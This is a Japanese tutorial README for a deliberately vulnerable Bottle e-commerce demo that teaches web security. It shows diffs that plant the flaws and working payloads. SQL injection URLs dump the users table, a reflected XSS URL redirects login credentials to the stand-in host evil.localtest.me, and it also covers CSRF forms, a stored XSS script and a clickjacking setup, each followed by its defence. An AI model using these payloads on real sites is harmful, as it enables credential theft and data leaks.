# bottle-store

PythonのマイクロフレームワークBottleを使ったECサイトのデモンストレーションです。ソースコードにわざと脆弱性を仕込むことで、どんな攻撃が可能になるかを示していきます。

OSはWindows、WebブラウザーはFirefoxを利用する前提で説明します。

デモンストレーションを理解するのに必要な基礎知識は次の通りです：

- [Webセキュリティについての基礎知識](/web-security.md)
- [Webアプリケーションフレームワークについての基礎知識](/web-application-framework.md)
- [Bottleの使い方](/bottle-tutorial.md)

## デモのはじめかた（Windows）

まずPython3をインストールします。

Visual Studio Code を使用して Python 初心者向けの開発環境をセットアップする
https://docs.microsoft.com/ja-jp/learn/modules/python-install-vscode/

2921/01/10時点ではPython 3.9.1が最新でした。

Python3のインストールが完了したら、仮想環境を作ります。仮想環境名は```venv```とします。

```console
> py -m venv venv
(venv)>
```

必要なモジュールをインストールします。

```console
(venv)> pip install -r requirements.txt
```

データベースを初期化します。データベースのファイル```app.db```と```evil.db```が作成されます。

```console
(venv)> py setup.py
```

署名付きcookieのための鍵を環境変数```STORE_SECRET_KEY```に設定します。

```console
(venv)> set STORE_SECRET_KEY=<署名付きcookieのための鍵（文字列）>
```

ECサイトを起動します。localhost:8080で立ち上がります。環境変数を設定し忘れていると、RuntimeErrorが発生して起動できないのでご注意ください。

```console
(venv)> py app.py
```

Firefoxで http://localhost:8080/ にアクセスすると使えます。

利用者1でログインしてみます。

- メールアドレス
  - user1@example.com
- パスワード
  - password1

ログインに成功すると、商品一覧が表示されます。

```
http://localhost:8080/products
```

商品の詳細ページからレビューを投稿できます。

```
http://localhost:8080/products/1
```

なお、購入は簡易的な実装で、アラートが表示されるだけです。

## ここから先の注意事項

犯罪になるので、外部サービスに対してはここから先に書いてあることを試してはいけません。絶対にやめてください。

## SQLインジェクション

```app.py```を次のように書き換えます。プレースホルダ```?```（はてな）を使わずに、文字列を連結してSQL文を作っています。

```diff:app.py
-        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE ?;", ("%" + query + "%",)).fetchall()
+        results = cur.execute("SELECT * FROM rated_products WHERE name LIKE '%" + query + "%'").fetchall()
```

Firefoxで商品一覧を表示します。

```
http://localhost:8080/products
```

商品名で検索ができます。次のようなSQL文を使っているのではないか？と攻撃者は推測します。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE '%<検索文字列>%';
```

攻撃者は外部から入力される検索文字列の扱いが雑なことを期待して、SQL文の断片```'--```（シングルクォート、ハイフン、ハイフン）で検索してみます。

```
http://localhost:8080/products?q='--
```

攻撃者は実行されるSQL文が次のようになることを期待しています。LIKEの条件が間違った、おかしなSQL文です。おかしなSQL文が期待通りに実行されれば、エラーが表示されるはずです。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE '%'--%';
```

Internal Server Errorが表示され、攻撃者が入力したSQL文の断片によりSQLインジェクションが成功したことを示唆しています。

次に攻撃者はデータベースで管理しているテーブルの情報を引き出そうと試みます。SQLiteの場合は特別なテーブル```sqlite_master```から、データベースのメタ情報を引き出すことが可能です。

> The Schema Table
> 
> https://sqlite.org/schematab.html

```
http://localhost:8080/products?q=x%' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--
```

攻撃者が期待するSQL文は次の通りです。UNIONは2つのSELECTを統合するときに使います。前半のSELECTでは「xで終わる商品」を検索しています。後半のSELECTでは、テーブル名```tbl_name```と、テーブルを作成するsqlを検索します。sqlからカラム名が分かります。

```sql
SELECT * FROM <商品テーブル名> WHERE <商品名カラム> LIKE '%x' UNION SELECT 1, tbl_name, sql, 1, 1, 1 FROM sqlite_master--%';
```

検索結果からusersテーブルがあることと、そのカラム名が分かりました。ここからさらに情報を引き出します。

```
http://localhost:8080/products?q=x%' UNION SELECT 1, id, email, 1, hashed_password, nickname FROM users--
```

usersテーブルのid、email、hashed_password、nicknameが漏洩してしまいました。かろうじてパスワードをハッシュ化していましたが、平文で保存していたら目も当てられません。

### SQLインジェクションを防ぐには

絶対にプレースホルダーを使いましょう！

### 参考情報

> SQLインジェクションによりクレジットカード情報を盗むデモンストレーション（Type1）
> 
> https://www.youtube.com/watch?v=Vvgmeu128ak
> 
> [![](http://img.youtube.com/vi/Vvgmeu128ak/0.jpg)](http://www.youtube.com/watch?v=Vvgmeu128ak "")

## 反射型クロスサイトスクリプティング（Reflected XSS）

```app.py```を次のように書き換えます。画面に表示する変数```message```のエスケープ漏れです。bottleのテンプレートで!（エクスクラメーションマーク）は、変数をエスケープせず生のまま表示することを意味します。

```diff:app.py
-<p style="color:red;"> {{ message }} </p>
+<p style="color:red;"> {{ !message }} </p>
```

攻撃者は、ログイン画面でURLのquery parameterとして渡した文字列が画面に表示されていることに着目し、query parameterの扱いが雑になっていることを期待して、次のようなURLでアクセスしてきます。HTMLで```\<s\>```タグは取り消し線を意味します。

```
http://localhost:8080/login?message=<s>hello</s>
```

取り消されたhelloが表示され、エスケープ漏れがあることが分かりました。次に期待するのはスクリプトの混入です。

```
http://localhost:8080/login?message=<script>alert(1)</script>
```

```1```がアラートされ、スクリプトの混入に成功したことが分かります。攻撃者は自分のサイトを立ち上げ、ログイン画面に入力された情報を盗み出そうとします。まず、盗み出した情報を取得するWebアプリを起動します。別のコマンドプロンプトを立ち上げて、```evil.py```を実行してください。攻撃者のWebアプリは、evil.localtest.meというホスト名の8081ポートで起動します。

ここで```localtest.me```というドメイン名は、DNSによってループバックアドレス```127.0.0.1```として解決されます。なので、Firefoxで```*.localtest.me```へのアクセスするのは、localhostにアクセスするのと同じです。

localhostに別名を与えるのによく使うのはhostsファイルですが、管理者権限でhostsファイルを編集する必要がないので便利です。他には```lvh.me```というドメインが有名です。

> Scott Forsyth's Blog - Introducing Testing Domain - localtest.me
> 
> https://weblogs.asp.net/owscott/introducing-testing-domain-localtest-me

```console
> .\venv\Scripts\activate
(venv)> py evil.py
```

攻撃者はログイン画面にスクリプトを混入することで、同じログイン画面にもかかわらず、データの向き先を変更できてしまいます。正規の利用者が次のURLをクリックすると、画面上は何も変わりがありませんが、向き先の変わったログイン画面が表示されます。

```
http://localhost:8080/login?message=<script>window.onload=function(){document.querySelector('form').action='http://evil.localtest.me:8081/users'}</script>
```

利用者が送信ボタンを押してしまうと入力した情報が攻撃者に渡ってしまいます。攻撃者が盗み出した情報は、Firefoxで確認できます。

```
http://evil.localtest.me:8081/users
```

### XSSを防ぐには

意図しないエスケープ漏れをなくしましょう！

攻撃者は様々な手法で不正アクセスを試みます。XSSのゲームを通じて手法を学びつつ、セキュリティ診断ツールも活用してセキュリティを確保しましょう。

- XSS game https://xss-game.appspot.com/
- prompt(1) to win - 0x0 https://prompt.ml/0

### 反射型XSSのさらなる対策

Webブラウザーが持つセキュリティ機能を、Webアプリ側が強制的に有効にする方法があります。

- X-XSS-Protectionヘッダー
  - 1にすると、WebブラウザーのXSSフィルターを有効にします。また、mode=blockを指定するとWebブラウザーがXSSを検出した時にWebページの表示を停止します。
  - ```X-XSS-Protection: 1; mode=block```
- Content-Security-Policyヘッダー
  - 様々なセキュリティポリシーを設定できます。例えば、全てのリソースを同じドメインからのみ取得させるには次のように指定します。
  - ```Content-Security-Policy: default-src 'self'```

## クロスサイト・リクエストフォージェリ（CSRF）と蓄積型クロスサイトスクリプティング（Persistent XSS）の合わせ技

```app.py```を次のよう書き換えます。うっかりクッキーのsamesite属性を指定し忘れてしまいました。外部サイトに設置されたフォームからPOSTメソッドで正規のサイトにリクエストを出した時に、正規サイトのクッキーをそのリクエストに付与してしまいます。

```diff:app.py
-    response.set_cookie('user_id', user_id, secret=SECRET_KEY, path='/', httponly=True, samesite='lax')
-    response.set_cookie('nickname', nickname, secret=SECRET_KEY, path='/', httponly=True, samesite='lax')
+    response.set_cookie('user_id', user_id, secret=SECRET_KEY, path='/', httponly=True)
+    response.set_cookie('nickname', nickname, secret=SECRET_KEY, path='/', httponly=True)
```

利用者がWebブラウザーで正規のサイトのフォームを開いてから情報を投稿するのが正規の流れですが、それ以外のやり方で投稿できるようになってしまいました。

> samesite | Cookies(クッキー), document.cookie
> 
> https://ja.javascript.info/cookie#ref-497

なおInternet Explorerはsamesiteに対応していません。

> SameSite cookies - HTTP | MDN
> 
> https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite

攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

```
http://evil.localtest.me:8081/game1
```

クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げる作戦です。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="最高の商品です！本当は★100を付けたいくらい！" />
  <input type="submit" value="遊んでみる" />
</form>
```

利用者はゲームで遊ぼうと攻撃者のサイトでボタンをクリックしただけなのに、商品1に高評価をつけてしまいます。別のサイトに利用者をアクセスさせて、利用者が意図しない投稿をさせてしまう攻撃がクロスサイト・リクエストフォージェリ（CSRF）です。

攻撃者の準備したフォームにあるuser_idはSQLインジェクションで入手したものを使っている前提です。

意図しない投稿は商品1のレビューです。確認してみます。

```
http://localhost:8080/products/1
```

なお、Chromeの場合はこの攻撃が成立せず、ログインが求められることになります。Chromeの場合、クッキーのsamesite属性が指定されていないリクエストは、```samesite='lax'```が指定されたものとして扱うためです。

さらに```app.py```を書き換え、```comment```のエスケープを外します。これで、商品の詳細ページにXSSが可能になってしまいます。

```diff:app.py
-        <li>{{ comment }}</li>
+        <li>{{ !comment }}</li>
```

攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

```
http://evil.localtest.me:8081/game2
```

クリックすると、利用者が意図しない投稿をしてしまうフォームになっています。評価を釣り上げるだけでなく、XSSを埋め込んでうその金額にページを書き換えてしまいます。window.onload はページの読み込みが終了すると実行されます。

```html
<form action="http://localhost:8080/reviews" method="post">
  <input type="hidden" name="product_id" value="1" />
  <input type="hidden" name="user_id" value="1" />
  <input type="hidden" name="rate" value="5" />
  <input type="hidden" name="comment" value="本当は★100を付けたいくらい最高の商品なのに、今だけ100円で売ってます！！<script>window.onload=function(){
      var td = document.querySelectorAll('tr td')[7];
      td.innerHTML = '<s>' + td.innerHTML + '</s><b>今だけ100円！！</b>';
  }</script>" />
  <input type="submit" value="遊んでみる" />
</form>
```

利用者が意図せずに投稿してしまったスクリプト付きコメントは、利用者本人はもちろん、他の利用者がこのコメントを閲覧した時にも実行され、金額を書き換えてしまいます。

反射型XSSは、スクリプトが仕込まれたURLをクリックした人だけに影響しました。しかし、蓄積型XSSはその他すべての人に影響してしまいます。

### CSRFを防ぐには

クッキーのsamesite属性を利用しましょう。

なお、Internet Explorerをはじめとする古いWebブラウザーではsamesiteに対応していないため、利用者が情報を投稿するのに使うフォームにトークンを埋め込み、正しいトークンと一緒に投稿されたかどうかを確認する必要があります。

## クリックジャッキング（Clickjacking）

```app.py```を次のよう書き換えます。X-Frame-Optionsヘッダーのヘッダー名を間違え、sを抜かしたX-Frame-Optionにしてしまいました。

HTMLの```\<iframe\>```タグを使うことで、別のサイトのWebページを自サイト上に掲載することができます。X-Frame-Optionsヘッダーは、別のサイトがiframe内にそのページを表示してよいかどうかを設定します。ヘッダー名を間違えてしまったので有効にならず、誰でもそのページをiframe内に表示することができるようになってしまいました。

```diff:app.py
-    response.headers['X-Frame-Options'] = 'DENY'
+   response.headers['X-Frame-Option'] = 'DENY'
```

攻撃者は攻撃サイトを準備し、甘い言葉で正規の利用者にクリックを促します。

```
http://evil.localtest.me:8081/game3
```

攻撃サイト上には、iframeで商品一覧ページが表示されていますが、消すチェックボックスを有効にすると、商品一覧ページが消えてしまいます。実際は消えているのではなく、CSSで透明度を変更し、見えなくしているだけで、そこに存在しています。正規の利用者がボタンをクリックすると、勝手に商品を購入してしまいます。

クリックする対象を隠すことで、意図しない結果を誘発するこの攻撃手法はクリックジャッキングと呼ばれています。

### Clickjackingを防ぐには

X-Frame-Optionsヘッダーを正しく設定しましょう！

## ツールを活用しよう！

ここで紹介した攻撃は代表的なもので、かつ、ごく一部です。全ての脆弱性を人間が見つけるのは大変困難です。そこで登場するのがセキュリティ診断ツールです。ツールを活用すれば、網羅的かつ効率的に脆弱性を見つけることができます。

例えば、無料で使えるWebセキュリティ診断ツールにOWASP ZAPがあります。

> OWASP Zed Attack Proxy
> 
> https://www.zaproxy.org/

ただ、脆弱性とその攻撃に関する知識がなければ、ツールを使いこなすことはできません。ツールがどうやって脆弱性を探しているのかが分からなければ、ツールへの適切な入力ができません。また、ツールから出力された診断結果を読み解いて対処するためには、脆弱性とその攻撃に関する知識が必要です。

今回学んだことを土台にして、情報セキュリティを確保する方法についてぜひ学び続けていってください。
